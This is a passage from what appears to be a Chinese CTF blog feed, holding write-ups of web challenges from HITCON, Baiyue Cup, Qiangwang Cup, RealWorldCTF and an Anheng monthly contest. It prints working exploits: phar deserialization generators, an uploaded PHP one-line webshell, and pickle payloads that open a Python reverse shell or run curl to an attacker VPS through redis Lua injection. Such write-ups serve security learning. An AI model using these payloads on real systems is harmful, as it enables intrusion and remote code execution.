class_">Phar</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/deser.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$p</span>[<span class="string">&#x27;file.txt&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title class_">Hui</span>());</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Could not create and/or modify phar:&#x27;</span>, <span class="variable">$e</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意提前把php.ini里面的phar的readonly改成off,不然会创建失败 底层代码<a href="https://github.com/php/php-src/blob/238916b5c9b7d09a711aad5656710eb4d1a80518/ext/phar/phar.c#L609" title="https://github.com/php/php-src/blob/238916b5c9b7d09a711aad5656710eb4d1a80518/ext/phar/phar.c#L609">https://github.com/php/php-src/blob/238916b5c9b7d09a711aad5656710eb4d1a80518/ext/phar/phar.c#L609</a> <img src="/images/2018/08/ichunqiu-9.jpg" alt="blacsheep" /> 当用<code>phar://</code>协议读取文件的时候,文件内容会被解析成<code>phar对象</code>,然后phar对象中的metadata反序列化,也就能构造一个我们想要的类了 给一个p师傅的poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$avatar</span> = <span class="string">&#x27;orz&#x27;</span>;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;file.php&#x27;</span>] = <span class="string">&#x27;&lt;?php ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="keyword">new</span> <span class="title class_">Admin</span>());</span><br><span class="line"><span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.phar&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/avatar.gif&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造出反序列化的admin对象之后,新的问题是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$FLAG</span>    = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里<code>create_function</code>没有函数名称,所以被设置成了<code>\x00lambda_%d</code>这里的%d每次+=1 不过这里%d会一直增大到最大长度直到结束,我们可以通过大量请求让pre-fork模式启动从而创建新的线程,这样%d就被刷新为1了,那么就成功预测了 整个攻击过程 首先运行脚本生成一个avatar文件,其中的metadata设置成要反序列化的类,生成一个avatar.gif,放到服务器上,然后upload上去 <img src="/images/2018/08/ichunqiu-10.jpg" alt="blacsheep" /> 然后测试一下phpinfo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.50.3.97:8005/?m=upload&amp;url=phar:///var/www/data/bc571eef5a23ff081aa7adc9b5f43d08&amp;lucky=phpinfo</span><br></pre></td></tr></table></figure><p>得到结果 <img src="/images/2018/08/ichunqiu-11.jpg" alt="blacsheep" /> 那么函数设置成<code>%00lambda_1</code>然后开多线程请求 <img src="/images/2018/08/ichunqiu-12.jpg" alt="blacsheep" /> 拿到flag</p><h2 id="第三届百越杯福建省高校网络空间安全大赛">第三届“百越杯”福建省高校网络空间安全大赛</h2><h3 id="do-you-know-upload">Do you know upload？</h3><p>进去发现是个上传页面,尝试hitcon的avatar.gif发现上传成功,然而里面有php的代码,于是改成一句话,burp抓包改后缀上传发现上传成功 <img src="/images/2018/08/ichunqiu-13.jpg" alt="blacsheep" /> 发现居然还有个包含漏洞,不过无所谓了,查看一下2.php,发现成功解析,就直接getshell了 进去发现config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;ctfctfctf&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;ctf&quot;</span>;</span><br></pre></td></tr></table></figure><p>连接数据库,发现flag <img src="/images/2018/08/ichunqiu-14.jpg" alt="blacsheep" /></p><h2 id="第二届广东省强网杯线上赛">2017第二届广东省强网杯线上赛</h2><h3 id="broken">broken</h3><p>进去发现jsfuck页面,复制解密,发现错误,check一下,发现少了一个<code>]</code>,添加上再解密,发现还是报错,类型错误,并不是函数,那么去掉最后的两个括号,再解密,得到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;var flag=&quot;flag&#123;f_f_l_u_a_c_g_k&#125;&quot;;alert(&#x27;flag is not here&#x27;);&quot;]</span><br></pre></td></tr></table></figure><p>即拿到flag</p><h3 id="who-are-you">who are you</h3><p>进去发现no permissions 看下cookie,发现<code>Zjo1OiJ0aHJmZyI7</code> base解一下,发现是<code>f:5:"thrfg";</code> 然后thrfg是guest的rot13,那么把admin的rot13传进去然后base一下进去发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]; <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]; --&gt;Hello admin, now you can upload something you are easy to forget.&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>那么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=1.php&amp;data=&lt;?php system($_GET[&#x27;a&#x27;])?&gt;</span><br></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://106.75.72.168:2222/uploads/1.php</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e07cd440-8eed-11e7-997d-7efc09eb6c59&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RealWorldCTF学习</title>
      <link href="/2018/08/10/realworldctf%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/08/10/realworldctf%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>长亭出题,对不起签到失败.. 但不管怎么说学习一下吧,简单记录两道题</p><h2 id="advertisement">Advertisement</h2><p><img src="/images/2018/08/rwctf-1.jpg" alt="blacsheep" /> 然后尝试扫目录 发现<a href="https://realworldctf.com/contest/5b5bc66832a7ca002f39a26b/www.zip" title="https://realworldctf.com/contest/5b5bc66832a7ca002f39a26b/www.zip">https://realworldctf.com/contest/5b5bc66832a7ca002f39a26b/www.zip</a> 然后拿到flag <img src="/images/2018/08/rwctf-2.jpg" alt="blacsheep" /> 当然还有对uid进行注入然后拿到flag的..反正大概就是要有日平台的心态咯..</p><h2 id="bookhub">BookHub</h2><p><img src="/images/2018/08/rwctf-3.png" alt="blacsheep" /> 去拿一下源码,发现是flask框架 然后发现view/user.py里面有一段eval,猜测代码执行 不过需要登录,查看登录代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@user_blueprint.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    form = LoginForm(data=flask.request.data)</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        user = User.query.filter_by(username=form.username.data).first()</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;book.admin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;login.html&#x27;</span>, form=form)</span><br></pre></td></tr></table></figure><p>然后去跟LoginForm</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LoginForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    username = StringField(<span class="string">&#x27;username&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    password = PasswordField(<span class="string">&#x27;password&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    remember_me = BooleanField(<span class="string">&#x27;remember_me&#x27;</span>, default=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">validate_password</span>(<span class="params">self, field</span>):</span><br><span class="line">        address = get_remote_addr()</span><br><span class="line">        whitelist = os.environ.get(<span class="string">&#x27;WHITELIST_IPADDRESS&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># If you are in the debug mode or from office network (developer)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> app.debug <span class="keyword">and</span> <span class="keyword">not</span> ip_address_in(address, whitelist):</span><br><span class="line">            <span class="keyword">raise</span> StopValidation(<span class="string">f&#x27;your ip address isn\&#x27;t in the <span class="subst">&#123;whitelist&#125;</span>.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        user = User.query.filter_by(username=self.username.data).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(field.data):</span><br><span class="line">            <span class="keyword">raise</span> StopValidation(<span class="string">&#x27;Username or password error.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后去看get_remote_addr()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_remote_addr</span>():</span><br><span class="line">    address = flask.request.headers.get(<span class="string">&#x27;X-Forwarded-For&#x27;</span>, flask.request.remote_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ipaddress.ip_address(address)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> address</span><br></pre></td></tr></table></figure><p>然后我们去改xff,不过发现并不能通过ip验证,猜测是做了一层nginx反代过了xff 然后看到ip里面有一个公网ip:18.213.16.123,扫端口发现5000端口,上去之后发现是调试模式 <img src="/images/2018/08/rwctf-4.jpg" alt="blacsheep" /> 但是发现可以refresh_session <img src="/images/2018/08/rwctf-5.jpg" alt="blacsheep" /> 那么我们继续看到eval的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">refresh_session</span>():</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        delete all session except the logined user</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :return: json</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        status = <span class="string">&#x27;success&#x27;</span></span><br><span class="line">        sessionid = flask.session.sid</span><br><span class="line">        prefix = app.config[<span class="string">&#x27;SESSION_KEY_PREFIX&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flask.request.form.get(<span class="string">&#x27;submit&#x27;</span>, <span class="literal">None</span>) == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rds.<span class="built_in">eval</span>(<span class="string">rf&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                local function has_value (tab, val)</span></span><br><span class="line"><span class="string">                    for index, value in ipairs(tab) do</span></span><br><span class="line"><span class="string">                        if value == val then</span></span><br><span class="line"><span class="string">                            return true</span></span><br><span class="line"><span class="string">                        end</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    return false</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                local inputs = &#123;&#123; &quot;<span class="subst">&#123;prefix&#125;</span><span class="subst">&#123;sessionid&#125;</span>&quot; &#125;&#125;</span></span><br><span class="line"><span class="string">                local sessions = redis.call(&quot;keys&quot;, &quot;<span class="subst">&#123;prefix&#125;</span>*&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                for index, sid in ipairs(sessions) do</span></span><br><span class="line"><span class="string">                    if not has_value(inputs, sid) then</span></span><br><span class="line"><span class="string">                        redis.call(&quot;del&quot;, sid)</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">except</span> redis.exceptions.ResponseError <span class="keyword">as</span> e:</span><br><span class="line">                app.logger.exception(e)</span><br><span class="line">                status = <span class="string">&#x27;fail&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(<span class="built_in">dict</span>(status=status))</span><br></pre></td></tr></table></figure><p>是个redis+session的反序列化 参考文章:<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html" title="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a> 然后sessionid可控,这里sessionid是拼接进去的,所以我们可以写入恶意代码 比如写个测试脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">prefix=<span class="string">&#x27;prefix&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;asijdoasijdoasji&quot;,evailcode,&quot;A&#x27;</span></span><br><span class="line">inputs=<span class="string">rf&#x27;&#123;&#123; &quot;<span class="subst">&#123;prefix&#125;</span><span class="subst">&#123;sessionid&#125;</span> &quot;&#125;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(inputs)</span><br><span class="line"><span class="comment"># &#123; &quot;prefixasijdoasijdoasji&quot;,evailcode,&quot;A &quot;&#125;</span></span><br></pre></td></tr></table></figure><p>然后就可以写入段evil代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis.call(&quot;set&quot;,&quot;bookhub:session:blacsheep&quot;,序列化之后的恶意代码)</span><br></pre></td></tr></table></figure><p>然后改sessionid为blacsheep的时候就回去反序列化恶意代码,然后触发反弹shell 给个chamd5的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">req = requests.Session()</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://18.213.16.123:5000/&quot;</span> <span class="keyword">if</span> <span class="keyword">not</span> DEBUG <span class="keyword">else</span> <span class="string">&quot;http://127.0.0.1:5000/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rs</span>(<span class="params">n=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        listen_ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">        listen_port = <span class="number">1234</span></span><br><span class="line">        s = <span class="string">&#x27;python -c \&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;%s&quot;,%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\&#x27;&#x27;</span> % (</span><br><span class="line">            listen_ip, listen_port)</span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">x = [&#123;<span class="string">&#x27;_fresh&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;_permanent&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">      <span class="string">&#x27;csrf_token&#x27;</span>: <span class="string">&#x27;2f898d232024ac0e0fc5f5e6fdd3a9a7dad462e8&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>: exp()&#125;]</span><br><span class="line">s = cPickle.dumps(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = urllib.quote(s)</span><br><span class="line">    yoursid = <span class="string">&#x27;vvv&#x27;</span></span><br><span class="line">    funcode = <span class="string">r&quot;local function urlDecode(s) s = string.gsub(s, &#x27;%%(%x%x)&#x27;, function(h) return string.char(tonumber(h, 16)) end) return s end&quot;</span></span><br><span class="line">    <span class="comment"># 插入payload并防止del</span></span><br><span class="line">    sid = <span class="string">&#x27;%s\\&quot; &#125; %s &#x27;</span> % (rs(<span class="number">6</span>), funcode) + \</span><br><span class="line">        <span class="string">&#x27;redis.call(\\&quot;set\\&quot;,\\&quot;bookhub:session:%s\\&quot;,\\urlDecode(&quot;%s\\&quot;)) inputs = &#123; \&quot;bookhub:session:%s\&quot; &#125; --&#x27;</span> % (</span><br><span class="line">            yoursid, payload, yoursid)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;bookhub-session=&quot;x%s&quot;&#x27;</span> % sid,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;X-CSRFToken&#x27;</span>: <span class="string">&#x27;ImY3NGI2MDcxNmQ5NmYwYjExZTQ4N2ZlYTMxNDg0ZGQ3NjA0MGU2OWIi.Dj9f9w.WL0VY6e2y6edFTh6QcOKo9DnzLw&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = req.get(URL + <span class="string">&#x27;login/&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">        html = res.content</span><br><span class="line">        r = re.findall(<span class="string">r&#x27;csrf_token&quot; type=&quot;hidden&quot; value=&quot;(.*?)&quot;&gt;&#x27;</span>, html)</span><br><span class="line">        <span class="keyword">if</span> r:</span><br><span class="line">            headers[<span class="string">&#x27;X-CSRFToken&#x27;</span>] = r[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># refresh_session</span></span><br><span class="line">            data = &#123;<span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">            res = req.post(URL + <span class="string">&#x27;admin/system/refresh_session/&#x27;</span>,</span><br><span class="line">                           data=data, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(res.content)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(res.content)</span><br><span class="line">            <span class="comment"># fuck</span></span><br><span class="line">            headers[<span class="string">&#x27;Cookie&#x27;</span>] = <span class="string">&#x27;bookhub-session=vvv&#x27;</span></span><br><span class="line">            res = req.get(URL + <span class="string">&#x27;admin/&#x27;</span>, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(res.content)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(res.content)</span><br></pre></td></tr></table></figure><p>然后sky的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;curl vps_ip:23333&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line">s_bypass = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    s_bypass +=<span class="string">&quot;string.char(%s)..&quot;</span>%<span class="built_in">ord</span>(i)</span><br><span class="line">evilcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">redis.call(&quot;set&quot;,&quot;bookhub:session:skycool&quot;,%s)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>%s_bypass[:-<span class="number">2</span>]</span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">6f17c248-ed0d-4d74-bba6-21b9342c854a&quot;,%s,&quot;bookhub:session:skycool</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>%evilcode</span><br><span class="line"><span class="built_in">print</span> payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>写好之后访问以下login页面就可以获得反弹的shell</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安恒七月月赛web</title>
      <link href="/2018/07/28/%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9Bweb/"/>
      <url>/2018/07/28/%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9Bweb/</url>
      
        <content type="html"><![CDATA[<p>大概还行,虽然有很多奇奇怪怪的地方</p><h3 id="order">order</h3><p>order注入,丢sqlmap 直接跑出结果</p><h3 id="就这么直接">就这么直接</h3><p>给了个源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>()); </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">rand</span>(<span 